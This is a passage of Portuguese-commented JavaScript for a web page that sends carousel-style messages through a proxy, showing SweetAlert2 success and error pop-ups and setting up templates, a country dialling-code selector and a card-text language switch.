        if (response.ok) {
            log.innerText = '✅ mensagem enviada com sucesso By Unlock center';
            try {
                Swal.fire({
                    icon: 'success',
                    title: 'Mensagem enviada!',
                    text: 'mensagem enviada com sucesso',
                    confirmButtonText: 'Ok',
                    customClass: { popup: 'swal-red-custom' }
                });
            } catch (e) {
                console.warn('SweetAlert2 não pôde ser carregado ou chamado:', e);
            }
        } else {
            // Extrair apenas a mensagem de erro do JSON
            let errorMessage = '❌ Erro desconhecido';
            if (data && data.error) {
                errorMessage = `❌ ${data.error} ❌`;
            }
            log.innerText = errorMessage;
            console.error('Erro na resposta do proxy:', data);
            try {
                Swal.fire({
                    icon: 'error',
                    title: 'Falha ao enviar',
                    text: data && data.error ? data.error : 'Verifique os dados e tente novamente.',
                    confirmButtonText: 'Ok',
                    customClass: {
                        popup: 'swal-red-custom'
                    }
                });
            } catch (e) {
                console.warn('SweetAlert2 não pôde ser carregado ou chamado (erro):', e);
            }
        }
    } catch (error) {
        log.innerText = '❌ Erro de conexão com o proxy:\n' + error.message;
        console.error('Erro de rede ou proxy:', error);
    }
}

document.addEventListener('DOMContentLoaded', () => {
    populateCarouselTemplatesDropdown();

    const mensagemGeralInput = document.getElementById("mensagemGeral");
    if (mensagemGeralInput) {
        // Inicializa a mensagem geral conforme idioma atual
        const gm = generalCarouselMessageTemplateLang[window.cardTextLang] || generalCarouselMessageTemplateLang.pt;
        mensagemGeralInput.value = gm;
        mensagemGeralInput.removeAttribute('readonly');
        mensagemGeralInput.addEventListener('input', () => {
            window.mensagemGeralEdited = true;
        });
    }

    // Inicializa com um cartão vazio (ou padrão)
    addCarouselCard();

    const countryDDISelect = document.getElementById("countryDDI");
    populateSelect(countryDDISelect, countriesDDI, true);

    countryDDISelect.value = "BR"; // Define DDI do Brasil como padrão

    if (window.enhanceSelect) {
        const seriesSelect = document.getElementById('carouselTemplate');
        if (seriesSelect) window.enhanceSelect(seriesSelect);
        if (countryDDISelect) window.enhanceSelect(countryDDISelect);
    }
});
// Define o idioma e atualiza o texto base de todos os cartões
window.setCardLanguage = function (lang) {
    const allowed = ['pt', 'en', 'es'];
    window.cardTextLang = allowed.includes(lang) ? lang : 'pt';
    const editors = document.querySelectorAll('.card-editor');
    const base = getDefaultCardTextByLang();
    editors.forEach(editor => {
        const cardId = editor.getAttribute('data-card-id');
        const textarea = document.getElementById(`card-text-${cardId}`);
        if (textarea) {
            textarea.setAttribute('data-template-text', base);
            updateCardText(cardId);
        }
    });
    // Atualiza também a Mensagem Geral conforme idioma
    const mensagemGeralInput = document.getElementById('mensagemGeral');
    if (mensagemGeralInput) {
        mensagemGeralInput.removeAttribute('readonly');
        const gm = generalCarouselMessageTemplateLang[window.cardTextLang] || generalCarouselMessageTemplateLang.pt;
        mensagemGeralInput.value = gm;
    }
};
